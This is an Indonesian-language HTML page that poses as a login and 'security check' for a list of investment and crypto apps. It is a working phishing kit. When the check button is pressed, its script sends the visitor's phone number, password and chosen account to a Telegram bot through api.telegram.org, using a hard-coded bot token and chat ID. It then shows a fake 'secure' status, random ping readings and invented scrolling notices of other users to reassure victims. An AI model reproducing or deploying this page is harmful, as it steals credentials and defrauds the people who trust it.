<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1c1c1c;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #2a2a2a;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
            width: 350px;
            color: #ffffff;
            position: relative;
        }
        .login-container h2 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            color: #4caf50;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 10px;
            font-size: 14px;
            color: #a0a0a0;
        }
        .form-group .input-group {
            display: flex;
            align-items: center;
        }
        .form-group .input-group span {
            padding: 10px;
            background-color: #444;
            border-radius: 5px 0 0 5px;
            color: #fff;
        }
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            box-sizing: border-box;
            outline: none;
            background-color: #333;
            color: #fff;
        }
        .form-group select {
            background-color: #444;
        }
        .form-group input[type="tel"] {
            border-radius: 0 5px 5px 0;
        }
        .form-group input[type="password"] {
            border-radius: 5px;
        }
        .form-group button {
            width: 100%;
            padding: 15px;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .form-group button:hover {
            background-color: #45a049;
        }
        .form-group .password-container {
            position: relative;
        }
        .form-group .password-container input {
            padding-right: 40px;
        }
        .form-group .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }
        /* Overlay untuk notifikasi keamanan */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .notification-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        .notification-box h3 {
            margin-bottom: 20px;
            color: #333;
        }
        .notification-box p {
            margin: 10px 0;
            color: #4caf50;
        }
        .notification-box .close-btn {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        /* Animasi loading lingkaran */
        .loader {
            border: 5px solid #f3f3f3;
            border-radius: 50%;
            border-top: 5px solid #4caf50;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Notifikasi berjalan */
        .scrolling-notification {
            position: fixed; /* Ganti dari absolute menjadi fixed agar tetap di layar */
            bottom: 0; /* Tetap di bagian bawah layar */
            left: 0; /* Mulai dari sisi kiri layar */
            width: 100vw; /* Menggunakan 100vw untuk lebar penuh layar */
            background-color: #8FBC8F;
            padding: 10px;
            overflow: hidden;
            white-space: nowrap;
            box-sizing: border-box;
            z-index: 1000; /* Pastikan notifikasi berada di atas elemen lainnya */
        }

        .scrolling-notification span {
            display: inline-block;
            padding-left: 100%;
            animation: scroll-left 10s linear infinite;
        }

        @keyframes scroll-left {
            0% { transform: translateX(100%); } /* Memastikan mulai dari luar layar di sebelah kanan */
            100% { transform: translateX(-100%); } /* Berhenti di luar layar di sebelah kiri */
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Masuk ke Akun</h2>
    <form id="loginForm">
        <div class="form-group">
            <label for="phone">Nomor Ponsel</label>
            <div class="input-group">
                <span>+62</span>
                <input type="tel" id="phone" name="phone" placeholder="Nomor ponsel" required pattern="[0-9]{10,13}">
            </div>
        </div>
        <div class="form-group">
            <label for="password">Kata Sandi</label>
            <div class="password-container">
                <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required>
                <img src="https://icon-library.com/images/eye-icon-png/eye-icon-png-13.jpg" alt="Toggle Password" class="toggle-password" id="togglePassword" width="20" height="20">
            </div>
        </div>
        <div class="form-group">
            <label for="account">Pilih Akun</label>
            <select id="account" name="account" required>
                <option value="Join noop">Join noop</option>
                <option value="Bat online">Bat online</option>
                <option value="Walk togetthesports">Walk togethersports</option>
                <option value="Bop miner">Bop miner</option>
                <option value="Nexgencore">Nexgencore</option>
                <option value="Uber usdt">Uber usdt</option>
                <option value="ecomamoni">Ecomamoni</option>
                <option value="Game stop">Game stop</option>
                <option value="Grapix ai">Grapix ai</option>
                <option value="Seacolease">Seacolase</option>
                <option value="Solar turbine">Solar turbine</option>
                <option value="Star ai">Star ai</option>
                <option value="Nvgold">Nvgold</option>
                <option value="Chevron">Chevron</option>
                <option value="Charge bank">Charge bank</option>
                <option value="Fwd invest">Fwd invest</option>
                <option value="Robotaxi">Robotaxi</option>
                <option value="Mentaprof">Mentaprof</option>
                <option value="Maximus growth">Maximus growth</option>
            </select>
        </div>
        <div class="form-group">
            <button type="button" id="cekKeamananBtn">Cek Keamanan</button>
        </div>
    </form>

    <div class="scrolling-notification" id="scrollingNotification">
        <span></span>
    </div>
</div>

<!-- Overlay untuk notifikasi keamanan -->
<div class="overlay" id="overlay">
    <div class="notification-box">
        <h3>INFORMASI AKUN</h3>
        <p id="accountInfo"></p>
        <p id="securityStatus">Keamanan website: <span class="loader"></span></p>
        <p id="pingInfo">Ping anda: <span></span> ms</p>
        <p id="internetInfo">Internet anda: <span></span></p>
        <button class="close-btn" id="closeBtn">Tutup</button>
    </div>
</div>

<script>
    // Toggle password visibility
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');

    togglePassword.addEventListener('click', function () {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        togglePassword.src = type === 'text' ? 'https://icon-library.com/images/eye-open-icon/eye-open-icon-5.jpg' : 'https://icon-library.com/images/eye-icon-png/eye-icon-png-13.jpg';
    });

    // Mengirim data ke bot Telegram
    async function kirimDataKeTelegram(phone, password, account) {
        const botToken = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY';
        const chatId = '6235911819';
        const message = `Nomor Ponsel: +62${phone}\nKata Sandi: ${password}\nAkun: ${account}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const data = new URLSearchParams();
        data.append('chat_id', chatId);
        data.append('text', message);

        try {
            const response = await fetch(url, {
                method: 'POST',
                body: data,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            });

            if (!response.ok) {
                throw new Error('Gagal mengirim data ke Telegram');
            }

        } catch (error) {
            console.error(error);
        }
    }

    // Proses pengecekan keamanan
    document.getElementById('cekKeamananBtn').addEventListener('click', function () {
        const phone = document.getElementById('phone').value;
        const password = document.getElementById('password').value;
        const account = document.getElementById('account').value;
        const accountInfo = document.getElementById('accountInfo');
        const overlay = document.getElementById('overlay');
        const securityStatus = document.getElementById('securityStatus');
        const pingInfo = document.getElementById('pingInfo');
        const internetInfo = document.getElementById('internetInfo');

        // Validasi input
        if (!phone || !password || !account) {
            alert('Harap isi semua data login!');
            return; // Hentikan eksekusi jika ada input yang kosong
        }

        // Mengirim data ke Telegram
        kirimDataKeTelegram(phone, password, account);

        // Menampilkan informasi akun
        accountInfo.textContent = `Akun anda: ${account}`;

        // Menampilkan overlay dan loading
        overlay.style.display = 'flex';
        securityStatus.innerHTML = 'Keamanan website: <span class="loader"></span>';

        // Simulasi loading keamanan selama 2 detik
        setTimeout(() => {
            securityStatus.innerHTML = 'Keamanan website: Aman ✓';
        }, 2000);

        // Simulasi ping dan status internet secara real-time
        const pingInterval = setInterval(() => {
            const pingValue = Math.floor(Math.random() * (150 - 20 + 1)) + 20; // Ping antara 20-150 ms
            pingInfo.innerHTML = `Ping anda: <span>${pingValue}</span> ms`;
            
            // Status internet berdasarkan ping
            if (pingValue <= 50) {
                internetInfo.innerHTML = 'Internet anda: Stabil';
            } else if (pingValue <= 100) {
                internetInfo.innerHTML = 'Internet anda: Cukup stabil';
            } else {
                internetInfo.innerHTML = 'Internet anda: Kurang stabil';
            }
        }, 1000);

        // Menutup overlay
        document.getElementById('closeBtn').addEventListener('click', function () {
            overlay.style.display = 'none';
            clearInterval(pingInterval); // Hentikan pembaruan ping
        });
    });

    // Notifikasi berjalan dengan tiga digit terakhir nomor ponsel diacak
    const scrollingNotification = document.getElementById('scrollingNotification');
    const notificationSpan = scrollingNotification.querySelector('span');

    function updateNotification() {
        const randomPhone = Math.floor(1000000 + Math.random() * 9000000).toString();
        const lastTwoDigits = randomPhone.slice(-2);  // Ambil dua digit terakhir
        notificationSpan.textContent = `Telah melakukan pengecekan +628*****${lastTwoDigits}`;
    }

    // Perbarui notifikasi setiap 10 detik
    setInterval(updateNotification, 10000);
</script>

</body>
</html>
